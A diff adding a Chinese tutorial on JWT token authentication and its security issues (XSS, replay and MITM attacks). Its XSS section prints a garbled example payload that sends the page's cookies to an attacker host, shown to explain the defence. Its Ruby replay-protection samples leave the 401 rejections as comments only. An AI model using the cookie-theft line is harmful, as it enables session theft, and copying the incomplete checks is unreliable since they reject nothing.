@@ -1,0 +1,202 @@
+基于 Token 的身份验证
+
+很多大型网站也都在用，比如 Facebook，Twitter，Google+，Github 等等，比起传统的身份验证方法，Token 扩展性更强，也更安全点，非常适合用在 Web 应用或者移动应用上。Token 的中文有人翻译成 “令牌”，意思就是，你拿着这个令牌，才能过一些关卡。
+
+传统身份验证的方法 Session
+HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。
+解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。
+上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session ，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session 。
+
+基于 Token 的身份验证方法
+使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：
+
+1.客户端使用用户名跟密码请求登录
+2.服务端收到请求，去验证用户名与密码
+3.验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端
+4.客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里
+5.客户端每次向服务端请求资源的时候需要带着服务端签发的 Token
+6.服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据
+
+JWT
+实施 Token 验证的方法挺多的，还有一些标准方法，比如 JWT，读作：jot ，表示：JSON Web Tokens 。JWT 标准的 Token 有三个部分：
+
+header
+payload
+signature
+
+中间用点分隔开，并且都会使用 Base64 编码，所以真正的 Token 看起来像这样：
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc
+
+Header
+header 部分主要是两部分内容，一个是 Token 的类型，另一个是使用的算法，比如下面类型就是 JWT，使用的算法是 HS256。
+
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+上面的内容要用 Base64 的形式编码一下，所以就变成这样：
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+
+Payload
+Payload 里面是 Token 的具体内容，这些内容里面有一些是标准字段，你也可以添加其它需要的内容。下面是标准字段：
+
+iss：Issuer，发行者
+sub：Subject，主题
+aud：Audience，观众
+exp：Expiration time，过期时间
+nbf：Not before
+iat：Issued at，发行时间
+jti：JWT ID
+比如下面这个 Payload ，用到了 iss 发行人，还有 exp 过期时间。另外还有两个自定义的字段，一个是 name ，还有一个是 admin 。
+
+{
+ "iss": "ninghao.net",
+ "exp": "1438955445",
+ "name": "wanghao",
+ "admin": true
+}
+使用 Base64 编码以后就变成了这个样子：
+
+eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ
+
+Signature
+JWT 的最后一部分是 Signature ，这部分内容有三个部分，先是用 Base64 编码的 header.payload ，再用加密算法加密一下，加密的时候要放进去一个 Secret ，这个相当于是一个密码，这个密码秘密地存储在服务端。
+
+header
+payload
+secret
+
+var encodedString = base64UrlEncode(header) + "." + base64UrlEncode(payload); 
+HMACSHA256(encodedString, 'secret');
+处理完成以后看起来像这样：
+
+SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc
+最后这个在服务端生成并且要发送给客户端的 Token 看起来像这样：
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc
+
+客户端收到这个 Token 以后把它存储下来，下回向服务端发送请求的时候就带着这个 Token 。服务端收到这个 Token ，然后进行验证，通过以后就会返回给客户端想要的资源。
+
+
+基于JWT的Token认证的安全问题
+
+确保验证过程的安全性
+如何保证用户名/密码验证过程的安全性；因为在验证过程中，需要用户输入用户名和密码，在这一过程中，用户名、密码等敏感信息需要在网络中传输。因此，在这个过程中建议采用HTTPS，通过SSL加密传输，以确保通道的安全性。
+
+如何防范XSS Attacks
+
+浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击(Cross Site Scripting)；如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码：
+
+<img src="x" /> a.src='https://hackmeplz.com/yourCookies.png/?cookies=’
++document.cookie;return a}())"
+这段代码会盗取你域中的所有cookie信息，并发送到 hackmeplz.com；那么我们如何来防范这种攻击呢？
+
+XSS攻击代码过滤
+移除任何会导致浏览器做非预期执行的代码，这个可以采用一些库来实现（如：js下的js-xss，JAVA下的XSS HTMLFilter，PHP下的TWIG）；如果你是将用户提交的字符串存储到数据库的话（也针对SQL注入攻击），你需要在前端和服务端分别做过滤；
+采用HTTP-Only Cookies
+通过设置Cookie的参数： HttpOnly; Secure 来防止通过JavaScript 来访问Cookie；
+如何在Java中设置cookie是HttpOnly呢？
+Servlet 2.5 API 不支持 cookie设置HttpOnly
+http://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/
+建议升级Tomcat7.0，它已经实现了Servlet3.0
+http://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Cookie.html
+或者通过这样来设置：
+//设置cookie
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
+
+//设置多个cookie
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
+response.addHeader("Set-Cookie", "timeout=30; Path=/test; HttpOnly");
+
+//设置https的cookie
+response.addHeader("Set-Cookie", "uid=112; Path=/; Secure; HttpOnly");
+在实际使用中，我们可以使FireCookie查看我们设置的Cookie 是否是HttpOnly；
+
+如何防范Replay Attacks
+所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程。比如在浏览器端通过用户名/密码验证获得签名的Token被木马窃取。即使用户登出了系统，黑客还是可以利用窃取的Token模拟正常请求，而服务器端对此完全不知道，以为JWT机制是无状态的。
+针对这种情况，有几种常用做法可以用作参考：
+
+1、时间戳 +共享秘钥
+这种方案，客户端和服务端都需要知道：
+
+User ID
+共享秘钥
+
+客户端
+
+auth_header = JWT.encode({
+  user_id: 123,
+  iat: Time.now.to_i,      # 指定token发布时间
+  exp: Time.now.to_i + 2   # 指定token过期时间为2秒后，2秒时间足够一次HTTP请求，同时在一定程度确保上一次token过期，减少replay attack的概率；
+}, "<my shared secret>")
+RestClient.get("http://api.example.com/", authorization: auth_header)
+服务端
+
+class ApiController < ActionController::Base
+  attr_reader :current_user
+  before_action :set_current_user_from_jwt_token
+
+  def set_current_user_from_jwt_token
+    # Step 1:解码JWT，并获取User ID，这个时候不对Token签名进行检查
+    # the signature. Note JWT tokens are *not* encrypted, but signed.
+    payload = JWT.decode(request.authorization, nil, false)
+
+    # Step 2: 检查该用户是否存在于数据库
+    @current_user = User.find(payload['user_id'])
+    
+    # Step 3: 检查Token签名是否正确.
+    JWT.decode(request.authorization, current_user.api_secret)
+    
+    # Step 4: 检查 "iat" 和"exp" 以确保这个Token是在2秒内创建的.
+    now = Time.now.to_i
+    if payload['iat'] > now || payload['exp'] < now
+      # 如果过期则返回401
+    end
+  rescue JWT::DecodeError
+    # 返回 401
+  end
+end
+
+2、时间戳 +共享秘钥+黑名单 （类似Zendesk的做法）
+客户端
+
+auth_header = JWT.encode({
+  user_id: 123,
+  jti: rand(2 << 64).to_s,  # 通过jti确保一个token只使用一次，防止replace attack
+  iat: Time.now.to_i,       # 指定token发布时间.
+  exp: Time.now.to_i + 2    # 指定token过期时间为2秒后
+}, "<my shared secret>")
+RestClient.get("http://api.example.com/", authorization: auth_header)
+服务端
+
+def set_current_user_from_jwt_token
+  # 前面的步骤参考上面
+  payload = JWT.decode(request.authorization, nil, false)
+  @current_user = User.find(payload['user_id'])
+  JWT.decode(request.authorization, current_user.api_secret)
+  now = Time.now.to_i
+  if payload['iat'] > now || payload['exp'] < now
+    # 返回401
+  end
+  
+  # 下面将检查确保这个JWT之前没有被使用过
+  # 使用Redis的原子操作
+  
+  # The redis 的键: <user id>:<one-time use token>
+  key = "#{payload['user_id']}:#{payload['jti']}"
+  
+  # 看键值是否在redis中已经存在. 如果不存在则返回nil. 如果存在则返回“1”. .
+  if redis.getset(key, "1")
+    # 返回401
+    # 
+  end
+  
+  # 进行键值过期检查
+  redis.expireat(key, payload['exp'] + 2)
+end
+
+如何防范MITM （Man-In-The-Middle）Attacks
+所谓MITM攻击，就是在客户端和服务器端的交互过程被监听，比如像可以上网的咖啡馆的WIFI被监听或者被黑的代理服务器等；
+针对这类攻击的办法使用HTTPS，包括针对分布式应用，在服务间传输像cookie这类敏感信息时也采用HTTPS；所以云计算在本质上是不安全的。
